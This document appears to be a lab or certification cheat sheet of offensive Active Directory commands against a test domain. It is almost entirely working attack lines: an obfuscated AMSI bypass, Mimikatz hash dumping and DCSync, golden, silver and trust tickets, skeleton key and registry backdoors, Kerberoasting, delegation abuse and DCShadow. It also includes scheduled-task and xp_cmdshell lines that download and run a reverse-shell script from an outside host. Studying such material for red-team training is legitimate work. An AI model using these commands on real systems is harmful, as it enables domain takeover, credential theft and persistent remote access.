## AMSI Bypass

- sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

## Services Issues using PowerUp

### Get services with unquoted paths and a space in their name.

- Get-ServiceUnquoted -Verbose

### Get services where the current user can write to its binary path or
change arguments to the binary

- Get-ModifiableServiceFile Verbose

### Get the services whose configuration current user can modify.

- Get-ModifiableService Verbose
- Invoke-ServiceAbuse -Name '<service name>'

## Run all checks from :

### PowerUp
- Invoke-AllChecks

### BeRoot is an executable:
- .\beRoot.exe

### Privesc
- Invoke-PrivEsc

## Over pass the hash

- Invoke-Mimikatz -Command '"sekurlsa::pth /user:yadm.ind01 /domain:ind.ycsccorp.local /ntlm:ae974876d974abd805a989ebead86846 /run:powershell.exe"'

## Extracting NTLM hashes from DC

- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername ycsc-ind-dc.ind.ycsccorp.local

## Persistence

### Kerberos Golden Ticket

- Invoke-Mimikatz -Command '"kerberos ::golden /User:Administrator /domain:ind.ycsccorp.local /sid:S-1-5-21-2459409151-1819855402-4290146463 /krbtgt:c8245073e958a34be21246fad7bb5981 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

### DCSync

- Invoke-Mimikatz -Command '"lsadump::dcsync /user:ind\krbtgt"'

### Silver Ticket (obtain shell using Scheduled tasks)

- Invoke-Mimikatz -Command '"kerberos::golden /domain:ind.ycsccorp.local /sid:S-1-5-21-2459409151-1819855402-4290146463 /target:ycsc-ind-dc.ind.ycsccorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'

- schtasks /create /S ycsc-ind-dc.ind.ycsccorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck5" /TR "p
owershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.15:8080/Invoke-PowerShellTcp2.ps1''')'"

- schtasks /Run /S ycsc-ind-dc.ind.ycsccorp.local /TN STCheck5

### Access via WMI (needs HOST and RPCSS silver tickets and WMI remote access to be allowed for Application Packages)

- Get-WmiObject Win32_OperatingSystem -ComputerName ycsc-ind-dc.ind.ycsccorp.local

### Skeleton Key attack (requires DA privileges, sets master password (sort of) to mimikatz for every user account)

- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName ycsc-ind-dc.ind.ycsccorp.local

### DSRM

- Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername ycsc-ind-dc

- Set registry to change DSRM logon behaviour (use Enter-PSSession first): New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

- Over pass the hash: Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:ycsc-ind-dc /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe"'

- Can list files using ls \\ycsc-ind-dc\c$

## Enterprise Admin Escalation (via trust ticket)

### Get Trust key

- Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName ycsc-ind-dc

- Invoke-Mimikatz -Command '"lsadump::dcsync /user:ind\ycsccorp$"'

### Generate inter-realm ticket

- Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ind.ycsccorp.local /sid:S-1-5-21-2459409151-1819855402-4290146463 /sids:S-1-5-21-1903738692-3409922728-2061204017-519 /rc4:2c399692b7336ce75d9ae51bd817718d service:krbtgt /target:ycsccorp.local /ticket:C:\ticket\trust_tkt.kirbi"'

- Sid of enterprise admin group: SID: S-1-5-21root domain-519 (Ref: https://support.microsoft.com/en-in/help/243330/well-known-security-identifiers-in-windows-operating-systems)

- Sid of root domain is displayed in the output of lsadump::trust command

### Generate service ticket

- .\asktgs.exe C:\Users\user.ind02\Documents\Workdesk\Tools\kekeo_old\trust_tkt.kirbi CIFS/ ycsc-dc.ycsccorp.local


### Inject ticket

- .\kirbikator.exe lsa .\CIFS.ycsc-dc.ycsccorp.local.kirbi

### Via Krbtgt

- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName ycsc-ind-dc

- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ind.ycsccorp.local /sid:S-1-5-21-2459409151-1819855402-4290146463/sids:S-1-5-21-1903738692-3409922728-2061204017-519 /krbtgt:c8245073e958a34be21246fad7bb5981 /ticket:C:\Users\user.ind02\Documents\Workdesk\Tools\krbtgt_tkt.kirbi"'

- Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\user.ind02\Documents\Workdesk\Tools\krbtgt_tkt.kirbi"'

### Cross forest

- Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ind.ycsccorp.local /sid:S-1-5-21-2459409151-1819855402-4290146463 /rc4:0f0a9dc34c9c689ba9a37181c3526151 /service:krbtgt /target:website.ubcorp.local /ticket:C:\Users\user.ind02\Documents\Workdesk\Tools\krbtgt_tkt.kirbi"'

- ./asktgs.exe  C:\Users\user.ind02\Documents\Workdesk\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/ubws-dc.ubcorp.local

- .\kirbikator.exe lsa .\CIFS.ubws-dc.website.ubcorp.local.kirbi

## Abusing ACL

- Using Powerview: Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user.ind02 -Rights All -Verbose 
- Using AD Module: Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=ind,DC=ycsccorp,DC=local' -Principal user.ind02 -Verbose
- Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
- Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user.ind02'}
- Add-DomainGroupMember -Identity 'Domain Admins' -Members user.ind02 -Verbose
- Set-ADACL -DistinguishedName 'DC=ind,DC=ycsccorp,DC=local' -Principal user.ind02 -GUIDRight DCSync -Verbose

## Abusing SD

- (To be run with DA Priv) Set-RemoteWMI -UserName user.ind02 -ComputerName ycsc-ind-dc -namespace 'root\cimv2' -Verbose
- Command to test access: Get-WMiobject -Class win32_operatingsystem -computername ycsc-ind-dc.ind.ycsccorp.local
- (To be run with DA Priv) Set-RemotePSRemoting -UserName user.ind02 -ComputerName ycsc-ind-dc.ind.ycsccorp.local -verbose
- Command to test access with normal shell: Invoke-Command -ComputerName ycsc-ind-dc -ScriptBlock {whoami}
- (To be run with DA Priv) Add-RemoteRegBackdoor -ComputerName ycsc-ind-dc -Trustee user.ind02 -Verbose
- (To be run with normal shell) Get-RemoteMachineAccountHash -ComputerName ycsc-ind-dc -Verbose
- (To be run with normal shell) Get-RemoteLocalAccountHash -ComputerName ycsc-ind-dc -Verbose
- (To be run with normal shell) Get-RemoteCachedCredential -ComputerName ycsc-ind-dc -Verbose 

## Kerberoast

- Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

### Requesting TGS

- Add-Type -AssemblyName System.IdentityModel
- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/ycsc-ind-mssql.ind.ycsccorp.local:1433"
- Invoke-Mimikatz -Command '"kerberos::list /export"'
- python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-user.ind02@MSSQLSvc~ycsc-ind-mssql.ind.ycsccorp.local~1433-IND.YCSCCORP.LOCAL.kirbi

### Targetted Kerberoasting

#### Enumerating accounts with Kerberos Preauth disabled

- Get-DomainUser -PreauthNotRequired -Verbose

- Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

#### Force disable Kerberos Preauth

Enumerate the permissions for RDPUsers on ACLs using PowerView

- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

## Unconstrained Delegation

- Get-NetComputer -Unconstrained
- Find-LocalAdminAccess
- $sess = New-PSSession -ComputerName ycsc-ind-intra.ind.ycsccorp.local
- Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
- Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
- Invoke-Mimikatz -Command '"kerberos::ptt <path to stored ticket>"'
  
## Constrained Delegation

### Enumerate users and computers with constrained delegation enabled

- Using PowerView_dev 
-- Get-DomainUser -TrustedToAuth
-- Get-DomainComputer -TrustedToAuth

- Using ADModule 
-- Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

#### With user account

- Requesting TGT: tgt::ask /user:webadmin.ind01 /domain:ind.ycsccorp.local /rc4:ae974876d974abd805a989ebead86846
- Requesting TGS - tgs::s4u /tgt:TGT_webadmin.ind01@IND.YCSCCORP.LOCAL_krbtgt~ind.ycsccorp.local@IND.YCSCCORP.LOCAL.kirbi /user:Administrator@ind.ycsccorp.local /service:cifs/ycsc-ind-mssql.ind.ycsccorp.LOCAL
- Injecting the ticket: Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@ind.ycsccorp.local@IND.YCSCCORP.LOCAL_cifs~ycsc-ind-mssql.ind.ycsccorp.LOCAL@IND.YCSCCORP.LOCAL.kirbi"'

#### With machine account

- Requesting TGT: tgt::ask /user:YCSC-IND-MAIL$ /domain:ind.ycsccorp.local /rc4:e94a370691087919d3a29ba807b47679
- Requesting TGS: tgs::s4u /tgt:TGT_YCSC-IND-MAIL$@IND.YCSCCORP.LOCAL_krbtgt~ind.ycsccorp.local@IND.YCSCCORP.LOCAL.kirbi /user:Administrator@ind.ycsccorp.local /service:time/ycsc-ind-dc.ind.ycsccorp.LOCAL | ldap/ycsc-ind-dc.ind.ycsccorp.LOCAL
- Injecting the ticket: Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@ind.ycsccorp.local@IND.YCSCCORP.LOCAL_ldap~ycsc-ind-dc.ind.ycsccorp.LOCAL@IND.YCSCCORP.LOCAL_ALT.kirbi"'
- DCSync Attack: Invoke-Mimikatz -Command '"lsadump::dcsync /user:ind\krbtgt"'

## Abusing SQL Trusts

### Searching Database Links

- Get-SQLServerLink -Instance ycsc-ind-mssql -Verbose
- select * from master..sysservers (from SSMS or any other similar tool)

### Enumerating Database Links Manually

- select * from openquery ("ycsc-ind-mssql",'select * from master.. sysservers')

### Enumerating Database Links

- Get-SQLServerLinkCrawl -Instance ycsc-ind-mssql -Verbose
- select * from openquery("ycsc-ind-mssql",'select * from openquery("ycsc-ind-mail","select * from master..sysservers")')

### Executing command (needs xp_cmdshell to be enabled and user with EXECUTE privileges)

- Get-SQLServerLinkCrawl -Instance ycsc-ind-mssql -Query "exec master..xp_cmdshell 'whoami'"
- select * from openquery("ycsc-ind-mssql",'select * from openquery("ycsc-ind-mail",''select * from openquery("ubws-sql",''''select @@version as version;exec master..xp_cmdshell "powershell whoami")'''')'')')
- Get-SQLServerLinkCrawl -Instance ycsc-ind-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.15:8080/Invoke-PowerShellTcp2.ps1'')"' | ft

## DCShadow

### DCShadow commands

- lsadump::dcshadow /object:user.ycsc02 /attribute:Description /value="Hello from DCShadow"
- Set-DCShadowPermissions -FakeDC ycsc-av -SAMAccountName user.ycsc02 -Username user.ycsc01 -Verbose (to use DCShadow without DA)
- (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl - to check adminsdholder acl
